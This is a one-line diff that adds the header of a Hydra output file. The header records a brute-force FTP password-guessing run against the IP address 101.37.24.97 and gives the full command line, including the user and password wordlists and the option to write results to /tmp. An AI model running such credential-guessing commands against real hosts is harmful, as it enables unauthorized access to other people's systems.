@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-08-05 08:09:30 on 101.37.24.97 ftp (hydra -L /opt/msray/users.txt -P /opt/msray/pw_big.txt -t 3 -W 6 -f -o /tmp/brute_ftp_101.37.24.97.txt ftp://101.37.24.97)
